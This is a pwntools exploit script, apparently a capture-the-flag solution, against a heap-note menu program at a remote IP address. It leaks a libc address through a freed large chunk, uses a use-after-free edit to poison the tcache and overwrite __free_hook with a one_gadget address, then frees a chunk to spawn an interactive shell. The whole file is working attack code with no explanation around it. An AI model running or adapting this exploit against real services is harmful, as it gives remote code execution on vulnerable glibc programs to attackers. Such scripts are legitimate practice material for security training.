from pwn import * 

context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']
# sh = process('./note')
sh = remote('159.75.104.107', 30369)

def Write(Until, Text):
    sh.sendlineafter(Until, Text)

def Add(Size):
    Write('5.exit', '1')
    Write('how long do you like to write?\n', str(Size))

def Dele(idx):
    Write('5.exit', '2')
    Write('which note do you like to delete?\n', str(idx))

def Edit(idx, Content):
    Write('5.exit', '3')
    Write('which note do you like to edit?\n', str(idx))
    sh.send(Content)

def Show(idx):
    Write('5.exit', '4')
    Write('which note do you like to show?\n', str(idx))

Add(0x500) # 0
Add(0x20)   # 1
Add(0x30)   # 2

Dele(0)
Show(0)
libc = ELF('./libc-2.27.so')
# libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
libcbase = u64(sh.recv(8)) - libc.symbols['__malloc_hook'] - 0x70
log.success('libcbase: ' + hex(libcbase)) 
Dele(1)


free_hook = libcbase + libc.symbols['__free_hook']
# one = [0x4f2c5, 0x4f322, 0x10a38c]
one = [0x4f3d5, 0x4f432, 0x10a41c]
one_gadget = one[1] + libcbase
# gdb.attach(sh, 'b * $rebase(0xC8D)')
Edit(1, p64(free_hook))
Add(0x20) # 3
Add(0x20) # 4
Edit(4, p64(one_gadget))
Dele(2)


# Show(-29)
# libcbase = u64(sh.recv(8))
# sleep(0.5)
# log.success('libcbase: ' + hex(libcbase))

    
sh.interactive()